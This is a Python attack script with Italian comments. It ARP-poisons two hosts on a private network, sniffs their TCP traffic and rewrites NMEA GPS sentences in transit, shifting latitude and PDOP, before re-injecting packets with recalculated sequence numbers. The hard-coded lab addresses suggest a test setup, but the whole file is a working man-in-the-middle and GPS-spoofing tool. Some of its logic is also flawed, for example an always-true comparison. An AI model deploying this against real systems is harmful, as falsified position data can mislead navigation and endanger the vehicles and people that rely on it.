import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP
import socket
import re
from scapy.all import Ether, ARP, srp, send, Raw
import time
import os
import sys
import threading

# Definizione dei flag TCP
FIN = 0x01
SYN = 0x02
PSH = 0x08
ACK = 0x10

# Massimo numero di sequenza possibile in TCP
biggest_seq_nr = (1 << 32) - 1

# Dizionari per il tracciamento dei numeri di sequenza e di ack
source_dict = {}
r_source_dict = {}
server_dict = {}
r_server_dict = {}

# Funzione per ottenere l'indirizzo MAC associato a un indirizzo IP
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

# Funzione per ottenere l'indirizzo IP locale
def get_local_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0.1)
    try:
        s.connect(('10.255.255.255', 1))
        ip_address = s.getsockname()[0]
    except Exception as e:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address

# Funzione per modificare le coordinate nei dati NMEA
def modify_coordinates(nmea_data):
    modified_data = []

    for line in nmea_data:
        if line.startswith("$GPGGA"):
            # Estrai la latitudine originale e modificala
            parts = line.split(",")
            latitude = float(parts[2][:2]) + float(parts[2][2:]) / 60
            print(f"Latitudine Originale (GPGGA): {latitude:.3f}")

            latitude += 10

            parts[2] = f"{latitude:.3f}"
            print(f"Latitudine Modificata (GPGGA): {latitude:.3f}")
            modified_data.append(",".join(parts))
        elif line.startswith("$GPGSA"):
            # Estrai il PDOP originale e modificalo
            parts = line.split(",")
            pdop = float(parts[15])
            print(f"PDOP Originale (GPGSA): {pdop:.1f}")

            pdop += 10

            parts[15] = f"{pdop:.1f}"
            print(f"PDOP Modificato (GPGSA): {pdop:.1f}")
            modified_data.append(",".join(parts))
        elif line.startswith("$GPRMC"):
            # Estrai la latitudine originale e modificala
            parts = line.split(",")
            latitude = float(parts[3][:2]) + float(parts[3][2:]) / 60
            print(f"Latitudine Originale (GPRMC): {latitude:.3f}")

            latitude += 10

            parts[3] = f"{latitude:.3f}"
            print(f"Latitudine Modificata (GPRMC): {latitude:.3f}")
            modified_data.append(",".join(parts))
        else:
            modified_data.append(line)

    return modified_data

# Funzione per eseguire l'ARP spoofing
def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Inviato a {} : {} è {}".format(target_ip, host_ip, self_mac))

# Funzione per ripristinare la tabella ARP
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, verbose=False)

# Funzione per eseguire l'ARP spoofing in un ciclo
def poison_loop(client_ip, server_ip, verbose=True):
    while True:
        spoof(client_ip, server_ip, verbose)
        spoof(server_ip, client_ip, verbose)
        time.sleep(1)

# Funzione per intercettare e manipolare i pacchetti in una connessione TCP
def sniffing_loop(client_ip, client_port, server_ip, server_port):
    while True:
        scapy.sniff(filter=f"tcp and (src host {client_ip} and src port {client_port})", prn=lambda x: handle_packet(x, server_ip, server_port, client_ip, client_port))

# Funzione per aggiornare i dizionari di tracciamento dei numeri di sequenza e ack
def update_maps(packet, source, destination):
    if source == destination:
        if packet[TCP].ack not in source_dict.keys():
            source_dict[packet[TCP].ack] = packet[TCP].ack
            r_source_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_server_dict.keys():
            r_server_dict[packet[TCP].seq] = packet[TCP].seq
    elif source == source:
        if packet[TCP].ack not in server_dict.keys():
            server_dict[packet[TCP].ack] = packet[TCP].ack
            r_server_dict[packet[TCP].ack] = packet[TCP].ack

        if packet[TCP].seq not in r_source_dict.keys():
            r_source_dict[packet[TCP].seq] = packet[TCP].seq

# Funzione per gestire i pacchetti intercettati
def handle_packet(packet, target_ip, target_port, client_ip, client_port):
    if IP in packet and TCP in packet and hasattr(packet[TCP], 'load'):
        if packet[IP].dst == target_ip and packet[TCP].dport == target_port:
            old_payload = packet[scapy.all.Raw].load
            nmea_data = packet[TCP].load.decode("ascii").split("\r\n")
            print("Pacchetto ricevuto:")
            print(nmea_data)
            modified_nmea_data = modify_coordinates(nmea_data)
            new_payload = modified_nmea_data
             # Verifica se il pacchetto contiene strati IP e TCP
            if packet.haslayer(IP) and packet.haslayer(TCP):
                flags = packet[TCP].flags
                # Estrai i flag TCP dal pacchetto
                if flags & ACK or flags & PSH:
                    # Verifica se nel pacchetto sono impostati i flag ACK o PSH
                    # Estrai gli indirizzi IP di origine e destinazione
                    source = packet[IP].src
                    destination = packet[IP].dst
                    update_maps(packet, source, destination)
                    # Aggiorna il mapping dei numeri di sequenza e di ACK
                    # Determina i futuri numeri di sequenza e di ACK in base all'origine
                    future_seq = future_ack = None
                    if source == client_ip:
                        future_seq = r_source_dict[packet.seq]
                        future_ack = server_dict[packet.ack]
                    elif source == target_ip:
                        future_seq = r_server_dict[packet.seq]
                        future_ack = source_dict[packet.ack]
                    else:
                        return packet
                    
                    modified_packet = IP(
                        src=packet[IP].src,
                        dst=packet[IP].dst
                    ) / TCP(
                        sport=packet[TCP].sport,
                        dport=packet[TCP].dport,
                        seq=future_seq,
                        ack=future_ack,
                        flags=packet[TCP].flags,
                        options=packet[TCP].options
                    ) / Raw(load=new_payload)
                    # Crea un pacchetto modificato con numeri di sequenza e di ACK adeguati
                    # Calcola i numeri di ACK originali e attuali
                    original_ack = (modified_packet.seq + len(new_payload)) % biggest_seq_nr
                    actual_ack = (packet.seq + len(old_payload)) % biggest_seq_nr
                    
                    # Aggiorna i mapping di ACK per l'origine appropriata
                    if source == client_ip:
                        source_dict[original_ack] = actual_ack
                        r_source_dict[actual_ack] = original_ack
                    elif source == target_ip:
                        server_dict[original_ack] = actual_ack
                        r_server_dict[actual_ack] = original_ack
                    
                print("Pacchetto Originale:")
                packet.show()
                print("Pacchetto Modificato:")
                modified_packet.show()
                # Stampa i pacchetti originali e modificati per il debugging

                send(modified_packet, verbose=False)
                print("Pacchetto modificato ed inviato.")
                time.sleep(1)
                # Invia il pacchetto modificato e introduce un ritardo


def main():
    try:
        client_ip = "172.18.0.3"
        client_port = 3000
        server_ip = "172.18.0.2"
        server_port = 5762
        verbose = True

        # Thread per l'ARP spoofing
        spoofing_thread = threading.Thread(target=poison_loop, args=(client_ip, server_ip, verbose))
        spoofing_thread.start()

        # Thread per l'intercettazione e la manipolazione dei pacchetti
        sniffing_thread = threading.Thread(target=sniffing_loop, args=(client_ip, client_port, server_ip, server_port))
        sniffing_thread.start()
    except KeyboardInterrupt:
        print("\nCtrl + C premuto............stop attacco")
        restore(client_ip, server_ip)
        restore(server_ip, client_ip)
        print("[+] Arp Spoof Stoppato")
        exit()

if __name__ == "__main__":
    main()
